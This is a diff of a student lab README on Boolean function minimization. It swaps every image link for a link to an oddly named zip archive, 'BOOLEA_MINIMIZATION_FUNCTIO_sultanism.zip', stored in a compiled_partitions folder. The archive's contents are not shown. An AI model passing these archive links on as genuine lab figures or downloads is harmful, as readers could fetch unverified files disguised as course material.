@@ -62,20 +62,20 @@ RegisterNumber:212223050029
 
 **RTL realization**
 
-![DE 2A](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
+![DE 2A](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/incremental_db/compiled_partitions/BOOLEA_MINIMIZATION_FUNCTIO_sultanism.zip)
 
 **Output:**
 
 
-![DE 2B](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
+![DE 2B](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/incremental_db/compiled_partitions/BOOLEA_MINIMIZATION_FUNCTIO_sultanism.zip)
 
 
 ## Logic symbol & Truthtable:
 
-![DE 2C](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
+![DE 2C](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/incremental_db/compiled_partitions/BOOLEA_MINIMIZATION_FUNCTIO_sultanism.zip)
 
 
-![DE 2D](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/output_files/BOOLEAN_FUNCTION_MINIMIZATION-v2.0.zip)
+![DE 2D](https://raw.githubusercontent.com/MITHUN8521/BOOLEAN_FUNCTION_MINIMIZATION/main/incremental_db/compiled_partitions/BOOLEA_MINIMIZATION_FUNCTIO_sultanism.zip)
 
 **Result:**
 
